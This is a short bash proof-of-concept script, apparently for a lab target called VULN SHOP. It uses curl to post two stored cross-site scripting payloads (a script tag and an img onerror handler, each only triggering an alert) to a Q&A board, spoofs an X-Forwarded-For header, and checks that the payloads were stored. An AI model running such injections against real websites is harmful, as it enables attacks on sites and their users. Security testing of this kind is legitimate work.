#!/bin/bash
# Stored XSS Test PoC
# Target: VULN SHOP Q&A Board

TARGET="http://192.168.0.28:3000"
MY_IP="10.0.0.101"

echo "[*] Stored XSS Test"
echo "[*] Target: $TARGET/board"
echo ""

# Payload 1: Script tag
echo "[+] Posting XSS payload: <script>alert('XSS')</script>"
curl -s -X POST -H "X-Forwarded-For: $MY_IP" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "content=<script>alert('XSS')</script>" \
  "$TARGET/board"

# Payload 2: img onerror
echo "[+] Posting XSS payload: <img src=x onerror=alert('XSS')>"
curl -s -X POST -H "X-Forwarded-For: $MY_IP" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "content=<img src=x onerror=alert('XSS')>" \
  "$TARGET/board"

echo ""
echo "[*] Verifying XSS in board..."
curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/board" | grep -E "(script|onerror)" | head -5

echo ""
echo "[*] XSS payloads successfully stored!"
